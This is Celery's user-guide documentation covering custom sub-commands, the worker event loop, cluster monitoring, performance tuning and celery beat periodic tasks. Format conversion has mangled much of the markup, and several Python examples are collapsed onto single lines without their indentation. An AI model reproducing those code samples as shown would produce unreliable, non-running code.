Adding new `celery` sub-commands `` ` -----------------------------------------  New commands can be added to the :program:`celery` umbrella command by using `setuptools entry-points`_.      Entry-points is special meta-data that can be added to your packages ``setup.py``program, and then after installation, read from the system using the :mod:`importlib` module.  Celery recognizes``celery.commands``entry-points to install additional sub-commands, where the value of the entry-point must point to a valid click command.  This is how the :pypi:`Flower` monitoring extension may add the :program:`celery flower` command, by adding an entry-point in :file:`setup.py`:``\`python setup( name='flower', entry\_points={ 'celery.commands': \[ 'flower = flower.command:flower', \], } )

</div>

The command definition is in two parts separated by the equal sign, where the `` ` first part is the name of the sub-command (flower), then the second part is the fully qualified symbol path to the function that implements the command: ``\`text flower.command:flower

The module path and the name of the attribute should be separated by colon `` ` as above.   In the module :file:`flower/command.py`, the command function may be defined as the following: ``\`python import click

> @click.command() @click.option('--port', default=8888, type=int, help='Webserver port') @click.option('--debug', is\_flag=True) def flower(port, debug): print('Running our command')

Worker API `` ` ==========   `~kombu.asynchronous.Hub` - The workers async event loop --------------------------------------------------------------- :supported transports: amqp, redis  .. versionadded:: 3.0  The worker uses asynchronous I/O when the amqp or redis broker transports are used. The eventual goal is for all transports to use the event-loop, but that will take some time so other transports still use a threading-based solution.  .. method:: hub.add(fd, callback, flags)   .. method:: hub.add_reader(fd, callback, \*args)      Add callback to be called when ``fd``is readable.      The callback will stay registered until explicitly removed using     `hub.remove(fd) <hub.remove>`, or the file descriptor is     automatically discarded because it's no longer valid.      Note that only one callback can be registered for any given     file descriptor at a time, so calling``add`a second time will remove     any callback that was previously registered for that file descriptor.      A file descriptor is any file-like object that supports the`fileno`method, or it can be the file descriptor number (int).  .. method:: hub.add_writer(fd, callback, \*args)      Add callback to be called when`fd``is writable.     See also notes for `hub.add_reader` above.  .. method:: hub.remove(fd)      Remove all callbacks for file descriptor``fd\`\` from the loop.

### Timer - Scheduling events

<div class="method">

timer.call\_after(secs, callback, args=(), kwargs=(), priority=0)

</div>

<div class="method">

timer.call\_repeatedly(secs, callback, args=(), kwargs=(), priority=0)

</div>

<div class="method">

timer.call\_at(eta, callback, args=(), kwargs=(), priority=0)

</div>

---

index.md

---

# User Guide

  - Release  

  - Date  

<div class="toctree" data-maxdepth="1">

application tasks calling canvas workers daemonizing periodic-tasks routing monitoring security optimizing debugging concurrency/index signals testing extending configuration sphinx

</div>

---

monitoring.md

---

# Monitoring and Management Guide

<div class="contents" data-local="">

</div>

## Introduction

There are several tools available to monitor and inspect Celery clusters.

This document describes some of these, as well as features related to monitoring, like events and broadcast commands.

## Workers

### Management Command-line Utilities (`inspect`/`control`)

`celery` can also be used to inspect and manage worker nodes (and to some degree tasks).

To list all the commands available do:

`` `console     $ celery --help  or to get help for a specific command do:  .. code-block:: console      $ celery <command> --help  Commands ``\` \~\~\~\~\~\~\~\~

  - **shell**: Drop into a Python shell.
    
    The locals will include the `celery` variable: this is the current app. Also all known tasks will be automatically added to locals (unless the `--without-tasks <celery shell --without-tasks>` flag is set).
    
    Uses `Ipython`, `bpython`, or regular `python` in that order if installed. You can force an implementation using `--ipython <celery shell --ipython>`, `--bpython <celery shell --bpython>`, or `--python <celery shell --python>`.

  - **status**: List active nodes in this cluster
    
    >   - \`\`\`console  
    >     $ celery -A proj status

  - **result**: Show the result of a task
    
    > 
    > 
    > ``` console
    > $ celery -A proj result -t tasks.add 4e196aa4-0141-4601-8138-7aa33db0f577
    > ```
    > 
    > Note that you can omit the name of the task as long as the task doesn't use a custom result backend.

\* **purge**: Purge messages from all configured task queues.

> This command will remove all messages from queues configured in the `CELERY_QUEUES` setting:
> 
> \> **Warning**

  - \>  
    There's no undo for this operation, and messages will be permanently deleted\!
    
    ``` console
    ```
    
    $ celery -A proj purge
    
    You can also specify the queues to purge using the <span class="title-ref">-Q</span> option:
    
    ``` console
    ```
    
    $ celery -A proj purge -Q celery,foo,bar
    
    and exclude queues from being purged using the <span class="title-ref">-X</span> option:
    
    ``` console
    ```
    
    $ celery -A proj purge -X celery

<!-- end list -->

  - **inspect active**: List active tasks
    
    > 
    > 
    > ``` console
    > $ celery -A proj inspect active
    > ```
    > 
    > These are all the tasks that are currently being executed.

  - **inspect scheduled**: List scheduled ETA tasks
    
    > 
    > 
    > ``` console
    > $ celery -A proj inspect scheduled
    > ```
    > 
    > These are tasks reserved by the worker when they have an <span class="title-ref">eta</span> or <span class="title-ref">countdown</span> argument set.

  - **inspect reserved**: List reserved tasks
    
    > 
    > 
    > ``` console
    > $ celery -A proj inspect reserved
    > ```
    > 
    > This will list all tasks that have been prefetched by the worker, and is currently waiting to be executed (doesn't include tasks with an ETA value set).

  - **inspect revoked**: List history of revoked tasks
    
    > 
    > 
    > ``` console
    > $ celery -A proj inspect revoked
    > ```

  - **inspect registered**: List registered tasks
    
    > 
    > 
    > ``` console
    > $ celery -A proj inspect registered
    > ```

  - **inspect stats**: Show worker statistics (see \[worker-statistics\](\#worker-statistics))
    
    > 
    > 
    > ``` console
    > $ celery -A proj inspect stats
    > ```

  - **inspect query\_task**: Show information about task(s) by id.
    
    > Any worker having a task in this set of ids reserved/active will respond with status and information.
    > 
    > ``` console
    > $ celery -A proj inspect query_task e9f6c8f0-fec9-4ae8-a8c6-cf8c8451d4f8
    > ```
    > 
    > You can also query for information about multiple tasks:
    > 
    > ``` console
    > $ celery -A proj inspect query_task id1 id2 ... idN
    > ```

  - **control enable\_events**: Enable events
    
    > 
    > 
    > ``` console
    > $ celery -A proj control enable_events
    > ```

  - **control disable\_events**: Disable events
    
    > 
    > 
    > ``` console
    > $ celery -A proj control disable_events
    > ```

  - **migrate**: Migrate tasks from one broker to another (**EXPERIMENTAL**).
    
    > 
    > 
    > ``` console
    > $ celery -A proj migrate redis://localhost amqp://localhost
    > ```
    
    This command will migrate all the tasks on one broker to another. As this command is new and experimental you should be sure to have a backup of the data before proceeding.

\> **Note** \> All `inspect` and `control` commands supports a `--timeout <celery inspect --timeout>` argument, This is the number of seconds to wait for responses. You may have to increase this timeout if you're not getting a response due to latency.

<div id="inspect-destination">

Specifying destination nodes `` ` ~~~~~~~~~~~~~~~~~~~~~~~~~~~~  By default the inspect and control commands operates on all workers. You can specify a single, or a list of workers by using the :option:`--destination <celery inspect --destination>` argument: ``\`console $ celery -A proj inspect -d <w1@e.com>,w2@e.com reserved

</div>

> $ celery -A proj control -d <w1@e.com>,w2@e.com enable\_events

<div id="monitoring-flower">

Flower: Real-time Celery web-monitor `` ` ------------------------------------  Flower is a real-time web based monitor and administration tool for Celery. It's under active development, but is already an essential tool. Being the recommended monitor for Celery, it obsoletes the Django-Admin monitor, ``celerymon`and the`ncurses`based monitor.  Flower is pronounced like "flow", but you can also use the botanical version if you prefer.  Features ~~~~~~~~  - Real-time monitoring using Celery Events      - Task progress and history     - Ability to show task details (arguments, start time, run-time, and more)     - Graphs and statistics  - Remote Control      - View worker status and statistics     - Shutdown and restart worker instances     - Control worker pool size and autoscale settings     - View and modify the queues a worker instance consumes from     - View currently running tasks     - View scheduled tasks (ETA/countdown)     - View reserved and revoked tasks     - Apply time and rate limits     - Configuration viewer     - Revoke or terminate tasks  - HTTP API      - List workers     - Shut down a worker     - Restart worker’s pool     - Grow worker’s pool     - Shrink worker’s pool     - Autoscale worker pool     - Start consuming from a queue     - Stop consuming from a queue     - List tasks     - List (seen) task types     - Get a task info     - Execute a task     - Execute a task by name     - Get a task result     - Change soft and hard time limits for a task     - Change rate limit for a task     - Revoke a task  - OpenID authentication  **Screenshots**  .. figure:: ../images/dashboard.png    :width: 700px  More screenshots_:    Usage ~~~~~  You can use pip to install Flower:`\`console $ pip install flower

</div>

Running the flower command will start a web-server that you can visit:

``` console
$ celery -A proj flower
```

The default port is <http://localhost:5555>, but you can change this using the `` ` `--port`_ argument: ``\`console $ celery -A proj flower --port=5555

Broker URL can also be passed through the `` ` :option:`--broker <celery --broker>` argument : ``\`console $ celery --broker=amqp://guest:<guest@localhost>:5672// flower or $ celery --broker=redis://guest:<guest@localhost>:6379/0 flower

Then, you can visit flower in your web browser :

``` console
$ open http://localhost:5555
```

Flower has many more features than are detailed here, including `` ` authorization options. Check out the `official documentation`_ for more information.     .. _monitoring-celeryev:  celery events: Curses Monitor -----------------------------  .. versionadded:: 2.0  `celery events` is a simple curses monitor displaying task and worker history. You can inspect the result and traceback of tasks, and it also supports some management commands like rate limiting and shutting down workers. This monitor was started as a proof of concept, and you probably want to use Flower instead.  Starting: ``\`console $ celery -A proj events

You should see a screen like:

![](../images/celeryevshotsm.jpg)

<span class="title-ref">celery events</span> is also used to start snapshot cameras (see `` ` [monitoring-snapshots](#monitoring-snapshots): ``\`console $ celery -A proj events --camera=\<camera-class\> --frequency=1.0

and it includes a tool to dump events to `stdout`:

``` console
$ celery -A proj events --dump
```

For a complete list of options use `!--help`:

``` console
$ celery events --help
```

<div id="monitoring-rabbitmq">

RabbitMQ `` ` ========  To manage a Celery cluster it is important to know how RabbitMQ can be monitored.  RabbitMQ ships with the `rabbitmqctl(1)`_ command, with this you can list queues, exchanges, bindings, queue lengths, the memory usage of each queue, as well as manage users, virtual hosts and their permissions.  > **Note** >      The default virtual host ( ``"/"`) is used in these     examples, if you use a custom virtual host you have to add     the`-p`argument to the command, for example:`rabbitmqctl list\_queues -p my\_vhost …`.. _monitoring-rmq-queues:  Inspecting queues -----------------  Finding the number of tasks in a queue:`\`console $ rabbitmqctl list\_queues name messages messages\_ready messages\_unacknowledged

</div>

Here <span class="title-ref">messages\_ready</span> is the number of messages ready `` ` for delivery (sent but not received), `messages_unacknowledged` is the number of messages that's been received by a worker but not acknowledged yet (meaning it is in progress, or has been reserved). `messages` is the sum of ready and unacknowledged messages.   Finding the number of workers currently consuming from a queue: ``\`console $ rabbitmqctl list\_queues name consumers

Finding the amount of memory allocated to a queue:

``` console
$ rabbitmqctl list_queues name memory
```

  - Tip  
    Adding the `-q` option to [rabbitmqctl(1)](http://www.rabbitmq.com/man/rabbitmqctl.1.man.html) makes the output easier to parse.

<div id="monitoring-redis">

Redis `` ` =====  If you're using Redis as the broker, you can monitor the Celery cluster using the `redis-cli(1)` command to list lengths of queues.  .. _monitoring-redis-queues:  Inspecting queues -----------------  Finding the number of tasks in a queue: ``\`console $ redis-cli -h HOST -p PORT -n DATABASE\_NUMBER llen QUEUE\_NAME

</div>

The default queue is named <span class="title-ref">celery</span>. To get all available queues, invoke:

``` console
$ redis-cli -h HOST -p PORT -n DATABASE_NUMBER keys \*
```

\> **Note** \> Queue keys only exists when there are tasks in them, so if a key doesn't exist it simply means there are no messages in that queue. This is because in Redis a list with no elements in it is automatically removed, and hence it won't show up in the <span class="title-ref">keys</span> command output, and <span class="title-ref">llen</span> for that list returns 0.

> Also, if you're using Redis for other purposes, the output of the <span class="title-ref">keys</span> command will include unrelated values stored in the database. The recommended way around this is to use a dedicated <span class="title-ref">DATABASE\_NUMBER</span> for Celery, you can also use database numbers to separate Celery applications from each other (virtual hosts), but this won't affect the monitoring events used by for example Flower as Redis pub/sub commands are global rather than database based.

<div id="monitoring-munin">

Munin `` ` =====  This is a list of known Munin plug-ins that can be useful when maintaining a Celery cluster.  * ``rabbitmq-munin`: Munin plug-ins for RabbitMQ.      https://github.com/ask/rabbitmq-munin  *`celery\_tasks``: Monitors the number of times each task type has   been executed (requires `celerymon`).      https://github.com/munin-monitoring/contrib/blob/master/plugins/celery/celery_tasks  *``celery\_tasks\_states``: Monitors the number of tasks in each state   (requires `celerymon`).      https://github.com/munin-monitoring/contrib/blob/master/plugins/celery/celery_tasks_states  .. _monitoring-events:  Events ======  The worker has the ability to send a message whenever some event happens. These events are then captured by tools like Flower, and :program:`celery events` to monitor the cluster.  .. _monitoring-snapshots:  Snapshots ---------  .. versionadded:: 2.1  Even a single worker can produce a huge amount of events, so storing the history of all events on disk may be very expensive.  A sequence of events describes the cluster state in that time period, by taking periodic snapshots of this state you can keep all history, but still only periodically write it to disk.  To take snapshots you need a Camera class, with this you can define what should happen every time the state is captured;  You can write it to a database, send it by email or something else entirely.  :program:`celery events` is then used to take snapshots with the camera, for example if you want to capture state every 2 seconds using the camera``myapp.Camera``you run :program:`celery events` with the following arguments:``\`console $ celery -A proj events -c myapp.Camera --frequency=2.0

</div>

<div id="monitoring-camera">

Custom Camera `` ` ~~~~~~~~~~~~~  Cameras can be useful if you need to capture events and do something with those events at an interval. For real-time event processing you should use `@events.Receiver` directly, like in [event-real-time-example](#event-real-time-example).  Here is an example camera, dumping the snapshot to screen: ``\`python from pprint import pformat

</div>

> from celery.events.snapshot import Polaroid
> 
>   - class DumpCam(Polaroid):  
>     clear\_after = True \# clear after flush (incl, state.event\_count).
>     
>       - def on\_shutter(self, state):
>         
>           - if not state.event\_count:  
>             \# No new events since last snapshot. return
>         
>         print('Workers: {0}'.format(pformat(state.workers, indent=4))) print('Tasks: {0}'.format(pformat(state.tasks, indent=4))) print('Total: {0.event\_count} events, {0.task\_count} tasks'.format( state))

See the API reference for `celery.events.state` to read more `` ` about state objects.  Now you can use this cam with :program:`celery events` by specifying it with the :option:`-c <celery events -c>` option: ``\`console $ celery -A proj events -c myapp.DumpCam --frequency=2.0

Or you can use it programmatically like this:

``` python
from celery import Celery
from myapp import DumpCam

def main(app, freq=1.0):
    state = app.events.State()
    with app.connection() as connection:
        recv = app.events.Receiver(connection, handlers={'*': state.event})
        with DumpCam(state, freq=freq):
            recv.capture(limit=None, timeout=None)

if __name__ == '__main__':
    app = Celery(broker='amqp://guest@localhost//')
    main(app)
```

<div id="event-real-time-example">

Real-time processing `` ` --------------------  To process events in real-time you need the following  - An event consumer (this is the ``Receiver``)  - A set of handlers called when events come in.      You can have different handlers for each event type,     or a catch-all handler can be used ('*')  - State (optional)    `@events.State` is a convenient in-memory representation   of tasks and workers in the cluster that's updated as events come in.    It encapsulates solutions for many common things, like checking if a   worker is still alive (by verifying heartbeats), merging event fields   together as events come in, making sure time-stamps are in sync, and so on.   Combining these you can easily process events in real-time:``\`python from celery import Celery

</div>

>   - def my\_monitor(app):  
>     state = app.events.State()
>     
>       - def announce\_failed\_tasks(event):  
>         state.event(event) \# task name is sent only with -received event, and state \# will keep track of this for us. task = state.tasks.get(event\['uuid'\])
>         
>           - print('TASK FAILED: %s\[%s\] %s' % (  
>             task.name, task.uuid, task.info(),))
>     
>       - with app.connection() as connection:
>         
>           - recv = app.events.Receiver(connection, handlers={  
>             'task-failed': announce\_failed\_tasks, '\*': state.event,
>         
>         }) recv.capture(limit=None, timeout=None, wakeup=True)
> 
>   - if \_\_name\_\_ == '\_\_main\_\_':  
>     app = Celery(broker='amqp://<guest@localhost>//') my\_monitor(app)

\> **Note** \> The `wakeup` argument to `capture` sends a signal to all workers to force them to send a heartbeat. This way you can immediately see workers when the monitor starts.

You can listen to specific events by specifying the handlers:

``` python
from celery import Celery

def my_monitor(app):
    state = app.events.State()

    def announce_failed_tasks(event):
        state.event(event)
        # task name is sent only with -received event, and state
        # will keep track of this for us.
        task = state.tasks.get(event['uuid'])

        print('TASK FAILED: %s[%s] %s' % (
            task.name, task.uuid, task.info(),))

    with app.connection() as connection:
        recv = app.events.Receiver(connection, handlers={
                'task-failed': announce_failed_tasks,
        })
        recv.capture(limit=None, timeout=None, wakeup=True)

if __name__ == '__main__':
    app = Celery(broker='amqp://guest@localhost//')
    my_monitor(app)
```

<div id="event-reference">

Event Reference `` ` ===============  This list contains the events sent by the worker, and their arguments.  .. _event-reference-task:  Task Events -----------  .. event:: task-sent  task-sent ~~~~~~~~~  :signature: ``task-sent(uuid, name, args, kwargs, retries, eta, expires, queue, exchange, routing\_key, root\_id, parent\_id)``Sent when a task message is published and the :setting:`task_send_sent_event` setting is enabled.  .. event:: task-received  task-received ~~~~~~~~~~~~~  :signature:``task-received(uuid, name, args, kwargs, retries, eta, hostname, timestamp, root\_id, parent\_id)`Sent when the worker receives a task.  .. event:: task-started  task-started ~~~~~~~~~~~~  :signature:`task-started(uuid, hostname, timestamp, pid)`Sent just before the worker executes the task.  .. event:: task-succeeded  task-succeeded ~~~~~~~~~~~~~~  :signature:`task-succeeded(uuid, result, runtime, hostname, timestamp)`Sent if the task executed successfully.  Run-time is the time it took to execute the task using the pool. (Starting from the task is sent to the worker pool, and ending when the pool result handler callback is called).  .. event:: task-failed  task-failed ~~~~~~~~~~~  :signature:`task-failed(uuid, exception, traceback, hostname, timestamp)`Sent if the execution of the task failed.  .. event:: task-rejected  task-rejected ~~~~~~~~~~~~~  :signature:`task-rejected(uuid, requeue)`The task was rejected by the worker, possibly to be re-queued or moved to a dead letter queue.  .. event:: task-revoked  task-revoked ~~~~~~~~~~~~  :signature:`task-revoked(uuid, terminated, signum, expired)`Sent if the task has been revoked (Note that this is likely to be sent by more than one worker).  -`terminated`is set to true if the task process was terminated,     and the`signum`field set to the signal used.  -`expired`is set to true if the task expired.  .. event:: task-retried  task-retried ~~~~~~~~~~~~  :signature:`task-retried(uuid, exception, traceback, hostname, timestamp)`Sent if the task failed, but will be retried in the future.  .. _event-reference-worker:  Worker Events -------------  .. event:: worker-online  worker-online ~~~~~~~~~~~~~  :signature:`worker-online(hostname, timestamp, freq, sw\_ident, sw\_ver, sw\_sys)``The worker has connected to the broker and is online.  - `hostname`: Nodename of the worker. - `timestamp`: Event time-stamp. - `freq`: Heartbeat frequency in seconds (float). - `sw_ident`: Name of worker software (e.g.,``py-celery``). - `sw_ver`: Software version (e.g., 2.2.0). - `sw_sys`: Operating System (e.g., Linux/Darwin).  .. event:: worker-heartbeat  worker-heartbeat ~~~~~~~~~~~~~~~~  :signature:``worker-heartbeat(hostname, timestamp, freq, sw\_ident, sw\_ver, sw\_sys, active, processed)``Sent every minute, if the worker hasn't sent a heartbeat in 2 minutes, it is considered to be offline.  - `hostname`: Nodename of the worker. - `timestamp`: Event time-stamp. - `freq`: Heartbeat frequency in seconds (float). - `sw_ident`: Name of worker software (e.g.,``py-celery``). - `sw_ver`: Software version (e.g., 2.2.0). - `sw_sys`: Operating System (e.g., Linux/Darwin). - `active`: Number of currently executing tasks. - `processed`: Total number of tasks processed by this worker.  .. event:: worker-offline  worker-offline ~~~~~~~~~~~~~~  :signature:``worker-offline(hostname, timestamp, freq, sw\_ident, sw\_ver, sw\_sys)\`\`

</div>

The worker has disconnected from the broker.

---

optimizing.md

---

# Optimizing

## Introduction

The default configuration makes a lot of compromises. It's not optimal for any single case, but works well enough for most situations.

There are optimizations that can be applied based on specific use cases.

Optimizations can apply to different properties of the running environment, be it the time tasks take to execute, the amount of memory used, or responsiveness at times of high load.

## Ensuring Operations

In the book Programming Pearls, Jon Bentley presents the concept of back-of-the-envelope calculations by asking the question;

> ❝ How much water flows out of the Mississippi River in a day? ❞

The point of this exercise\[1\] is to show that there's a limit to how much data a system can process in a timely manner. Back of the envelope calculations can be used as a means to plan for this ahead of time.

In Celery; If a task takes 10 minutes to complete, and there are 10 new tasks coming in every minute, the queue will never be empty. This is why it's very important that you monitor queue lengths\!

A way to do this is by \[using Munin \<monitoring-munin\>\](\#using-munin-\<monitoring-munin\>). You should set up alerts, that'll notify you as soon as any queue has reached an unacceptable size. This way you can take appropriate action like adding new worker nodes, or revoking unnecessary tasks.

## General Settings

### Broker Connection Pools

The broker connection pool is enabled by default since version 2.5.

You can tweak the `broker_pool_limit` setting to minimize contention, and the value should be based on the number of active threads/green-threads using broker connections.

### Using Transient Queues

Queues created by Celery are persistent by default. This means that the broker will write messages to disk to ensure that the tasks will be executed even if the broker is restarted.

But in some cases it's fine that the message is lost, so not all tasks require durability. You can create a *transient* queue for these tasks to improve performance:

`` `python     from kombu import Exchange, Queue      task_queues = (         Queue('celery', routing_key='celery'),         Queue('transient', Exchange('transient', delivery_mode=1),               routing_key='transient', durable=False),     )   or by using :setting:`task_routes`:  .. code-block:: python      task_routes = {         'proj.tasks.add': {'queue': 'celery', 'delivery_mode': 'transient'}     }   The ``delivery\_mode`changes how the messages to this queue are delivered.`\` A value of one means that the message won't be written to disk, and a value of two (default) means that the message can be written to disk.

To direct a task to your new transient queue you can specify the queue argument (or use the `task_routes` setting):

`` `python     task.apply_async(args, queue='transient')  For more information see the [routing guide <guide-routing>](#routing-guide-<guide-routing>).  .. _optimizing-worker-settings:  Worker Settings ``\` ===============

### Prefetch Limits

*Prefetch* is a term inherited from AMQP that's often misunderstood by users.

The prefetch limit is a **limit** for the number of tasks (messages) a worker can reserve for itself. If it is zero, the worker will keep consuming messages, not respecting that there may be other available worker nodes that may be able to process them sooner\[2\], or that the messages may not even fit in memory.

The workers' default prefetch count is the `worker_prefetch_multiplier` setting multiplied by the number of concurrency slots\[3\] (processes/threads/green-threads).

If you have many tasks with a long duration you want the multiplier value to be *one*: meaning it'll only reserve one task per worker process at a time.

However -- If you have many short-running tasks, and throughput/round trip latency is important to you, this number should be large. The worker is able to process more tasks per second if the messages have already been prefetched, and is available in memory. You may have to experiment to find the best value that works for you. Values like 50 or 150 might make sense in these circumstances. Say 64, or 128.

If you have a combination of long- and short-running tasks, the best option is to use two worker nodes that are configured separately, and route the tasks according to the run-time (see \[guide-routing\](\#guide-routing)).

### Reserve one task at a time

The task message is only deleted from the queue after the task is `acknowledged`, so if the worker crashes before acknowledging the task, it can be redelivered to another worker (or the same after recovery).

Note that an exception is considered normal operation in Celery and it will be acknowledged. Acknowledgments are really used to safeguard against failures that can not be normally handled by the Python exception system (i.e. power failure, memory corruption, hardware failure, fatal signal, etc.). For normal exceptions you should use task.retry() to retry the task.

<div class="seealso">

Notes at \[faq-acks\_late-vs-retry\](\#faq-acks\_late-vs-retry).

</div>

When using the default of early acknowledgment, having a prefetch multiplier setting of *one*, means the worker will reserve at most one extra task for every worker process: or in other words, if the worker is started with `-c 10 <celery worker -c>`, the worker may reserve at most 20 tasks (10 acknowledged tasks executing, and 10 unacknowledged reserved tasks) at any time.

Often users ask if disabling "prefetching of tasks" is possible, and it is possible with a catch. You can have a worker only reserve as many tasks as there are worker processes, with the condition that they are acknowledged late (10 unacknowledged tasks executing for `-c 10 <celery worker -c>`)

For that, you need to enable `late acknowledgment`. Using this option over the default behavior means a task that's already started executing will be retried in the event of a power failure or the worker instance being killed abruptly, so this also means the task must be `idempotent`

You can enable this behavior by using the following configuration options:

`` `python     task_acks_late = True     worker_prefetch_multiplier = 1  If you want to disable "prefetching of tasks" without using ack_late (because ``\` your tasks are not idempotent) that's impossible right now and you can join the discussion here <https://github.com/celery/celery/discussions/7106>

### Memory Usage

If you are experiencing high memory usage on a prefork worker, first you need to determine whether the issue is also happening on the Celery master process. The Celery master process's memory usage should not continue to increase drastically after start-up. If you see this happening, it may indicate a memory leak bug which should be reported to the Celery issue tracker.

If only your child processes have high memory usage, this indicates an issue with your task.

Keep in mind, Python process memory usage has a "high watermark" and will not return memory to the operating system until the child process has stopped. This means a single high memory usage task could permanently increase the memory usage of a child process until it's restarted. Fixing this may require adding chunking logic to your task to reduce peak memory usage.

Celery workers have two main ways to help reduce memory usage due to the "high watermark" and/or memory leaks in child processes: the `worker_max_tasks_per_child` and `worker_max_memory_per_child` settings.

You must be careful not to set these settings too low, or else your workers will spend most of their time restarting child processes instead of processing tasks. For example, if you use a `worker_max_tasks_per_child` of 1 and your child process takes 1 second to start, then that child process would only be able to process a maximum of 60 tasks per minute (assuming the task ran instantly). A similar issue can occur when your tasks always exceed `worker_max_memory_per_child`.

**Footnotes**

1.  The chapter is available to read for free here: [The back of the envelope](http://books.google.com/books?id=kse_7qbWbjsC&pg=PA67). The book is a classic text. Highly recommended.

2.  RabbitMQ and other brokers deliver messages round-robin, so this doesn't apply to an active system. If there's no prefetch limit and you restart the cluster, there will be timing delays between nodes starting. If there are 3 offline nodes and one active node, all messages will be delivered to the active node.

3.  This is the concurrency setting; `worker_concurrency` or the `celery worker -c` option.

---

periodic-tasks.md

---

# Periodic Tasks

<div class="contents" data-local="">

</div>

## Introduction

`celery beat` is a scheduler; It kicks off tasks at regular intervals, that are then executed by available worker nodes in the cluster.

By default the entries are taken from the `beat_schedule` setting, but custom stores can also be used, like storing the entries in a SQL database.

You have to ensure only a single scheduler is running for a schedule at a time, otherwise you'd end up with duplicate tasks. Using a centralized approach means the schedule doesn't have to be synchronized, and the service can operate without using locks.

## Time Zones

The periodic task schedules uses the UTC time zone by default, but you can change the time zone used using the `timezone` setting.

An example time zone could be \`Europe/London\`:

`` `python     timezone = 'Europe/London'  This setting must be added to your app, either by configuring it directly ``<span class="title-ref"> using (</span><span class="title-ref">app.conf.timezone = 'Europe/London'</span><span class="title-ref">), or by adding it to your configuration module if you have set one up using </span><span class="title-ref">app.config\_from\_object</span>\`. See \[celerytut-configuration\](\#celerytut-configuration) for more information about configuration options.

The default scheduler (storing the schedule in the `celerybeat-schedule` file) will automatically detect that the time zone has changed, and so will reset the schedule itself, but other schedulers may not be so smart (e.g., the Django database scheduler, see below) and in that case you'll have to reset the schedule manually.

<div class="admonition">

Django Users

Celery recommends and is compatible with the `USE_TZ` setting introduced in Django 1.4.

For Django users the time zone specified in the `TIME_ZONE` setting will be used, or you can specify a custom time zone for Celery alone by using the `timezone` setting.

The database scheduler won't reset when timezone related settings change, so you must do this manually:

  - \`\`\`console  
    $ python manage.py shell \>\>\> from djcelery.models import PeriodicTask \>\>\> PeriodicTask.objects.update(last\_run\_at=None)

Django-Celery only supports Celery 4.0 and below, for Celery 4.0 and above, do as follow:

``` console
$ python manage.py shell
>>> from django_celery_beat.models import PeriodicTask
>>> PeriodicTask.objects.update(last_run_at=None)
```

</div>

<div id="beat-entries">

Entries `` ` =======  To call a task periodically you have to add an entry to the beat schedule list. ``\`python from celery import Celery from celery.schedules import crontab

</div>

> app = Celery()
> 
> @app.on\_after\_configure.connect def setup\_periodic\_tasks(sender, \*\*kwargs): \# Calls test('hello') every 10 seconds. sender.add\_periodic\_task(10.0, test.s('hello'), name='add every 10')
> 
> > \# Calls test('hello') every 30 seconds. \# It uses the same signature of previous task, an explicit name is \# defined to avoid this task replacing the previous one defined. sender.add\_periodic\_task(30.0, test.s('hello'), name='add every 30')
> > 
> > \# Calls test('world') every 30 seconds sender.add\_periodic\_task(30.0, test.s('world'), expires=10)
> > 
> > \# Executes every Monday morning at 7:30 a.m. sender.add\_periodic\_task( crontab(hour=7, minute=30, day\_of\_week=1), test.s('Happy Mondays\!'), )
> 
> @app.task def test(arg): print(arg)
> 
> @app.task def add(x, y): z = x + y print(z)

Setting these up from within the <span class="title-ref">\~@on\_after\_configure</span> handler means `` ` that we'll not evaluate the app at module level when using ``test.s()``. Note that `~@on_after_configure` is sent after the app is set up, so tasks outside the module where the app is declared (e.g. in a `tasks.py` file located by `celery.Celery.autodiscover_tasks`) must use a later signal, such as `~@on_after_finalize`.  The `~@add_periodic_task` function will add the entry to the :setting:`beat_schedule` setting behind the scenes, and the same setting can also be used to set up periodic tasks manually:  Example: Run the `tasks.add` task every 30 seconds.``\`python app.conf.beat\_schedule = { 'add-every-30-seconds': { 'task': 'tasks.add', 'schedule': 30.0, 'args': (16, 16) }, } app.conf.timezone = 'UTC'

\> **Note** \> If you're wondering where these settings should go then please see \[celerytut-configuration\](\#celerytut-configuration). You can either set these options on your app directly or you can keep a separate module for configuration.

> If you want to use a single item tuple for <span class="title-ref">args</span>, don't forget that the constructor is a comma, and not a pair of parentheses.

Using a <span class="title-ref">\~datetime.timedelta</span> for the schedule means the task will `` ` be sent in 30 second intervals (the first task will be sent 30 seconds after `celery beat` starts, and then every 30 seconds after the last run).  A Crontab like schedule also exists, see the section on `Crontab schedules`_.  Like with :command:`cron`, the tasks may overlap if the first task doesn't complete before the next. If that's a concern you should use a locking strategy to ensure only one instance can run at a time (see for example [cookbook-task-serial](#cookbook-task-serial)).  .. _beat-entry-fields:  Available Fields ----------------  * `task`      The name of the task to execute.      Task names are described in the [task-names](#task-names) section of the User Guide.     Note that this is not the import path of the task, even though the default     naming pattern is built like it is.  * `schedule`      The frequency of execution.      This can be the number of seconds as an integer, a     `~datetime.timedelta`, or a `~celery.schedules.crontab`.     You can also define your own custom schedule types, by extending the     interface of `~celery.schedules.schedule`.  * `args`      Positional arguments (`list` or `tuple`).  * `kwargs`      Keyword arguments (`dict`).  * `options`      Execution options (`dict`).      This can be any argument supported by     `~celery.app.task.Task.apply_async` --     `exchange`, `routing_key`, `expires`, and so on.  * `relative`      If `relative` is true `~datetime.timedelta` schedules are scheduled     "by the clock." This means the frequency is rounded to the nearest     second, minute, hour or day depending on the period of the     `~datetime.timedelta`.      By default `relative` is false, the frequency isn't rounded and will be     relative to the time when :program:`celery beat` was started.  .. _beat-crontab:  Crontab schedules =================  If you want more control over when the task is executed, for example, a particular time of day or day of the week, you can use the `~celery.schedules.crontab` schedule type: ``\`python from celery.schedules import crontab

>   - app.conf.beat\_schedule = {  
>     \# Executes every Monday morning at 7:30 a.m. 'add-every-monday-morning': { 'task': 'tasks.add', 'schedule': crontab(hour=7, minute=30, day\_of\_week=1), 'args': (16, 16), },
> 
> }

The syntax of these Crontab expressions are very flexible.

Some examples:

